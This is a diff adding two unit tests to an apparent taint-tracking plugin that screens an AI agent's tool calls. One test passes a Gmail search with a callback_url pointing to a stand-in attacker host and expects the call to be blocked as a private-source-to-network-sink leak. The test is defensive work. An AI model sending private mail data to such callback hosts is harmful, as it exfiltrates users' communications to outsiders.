@@ -441,6 +441,32 @@ def test_transform_tool_result_logs_specific_source_taint_reason():
     assert rows[0]["reason"] == "tainted by email tool result (communications)"
 
 
+def test_mcp_read_query_url_is_not_intrinsic_network_sink():
+    plugin = load_plugin()
+
+    result = plugin._on_pre_tool_call(
+        tool_name="mcp_gmail_search",
+        args={"query": "list-unsubscribe https://newsletter.example/unsubscribe"},
+        session_id="s1",
+    )
+
+    assert result is None
+
+
+def test_mcp_read_query_callback_still_intrinsic_network_sink():
+    plugin = load_plugin()
+
+    result = plugin._on_pre_tool_call(
+        tool_name="mcp_gmail_search",
+        args={"query": "recent messages", "callback_url": "https://attacker.example/in"},
+        session_id="s1",
+    )
+
+    assert result is not None
+    assert result["action"] == "block"
+    assert "same-call MCP private source plus network/share sink" in result["message"]
+
+
 def test_transform_tool_result_logs_specific_content_pattern_taint_reason():
     plugin = load_plugin()
     bind_owner(plugin)
